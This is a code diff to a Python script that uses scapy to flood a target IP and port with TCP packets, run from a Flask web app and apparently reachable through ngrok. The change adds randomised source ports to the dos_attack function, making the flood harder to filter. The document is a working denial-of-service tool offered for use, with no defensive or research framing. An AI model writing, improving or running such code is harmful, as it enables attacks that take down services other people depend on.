@@ -1,6 +1,7 @@
 from scapy.all import IP, TCP, send
 from flask import Flask, request, jsonify
 import threading, time, uuid
+import random
 
 app = Flask(__name__)
 
@@ -37,7 +38,10 @@ def get_ngrok_url():
     return None
 
 def dos_attack(attack_id, target_ip, target_port, duration, rate):
-    packet = IP(dst=target_ip)/TCP(dport=target_port)
+    packet = IP(dst=target_ip)/TCP(
+    dport=target_port,
+    sport=random.randint(1024, 65535)
+)
     interval = 1 / rate
     end_time = time.time() + duration
     sent = 0
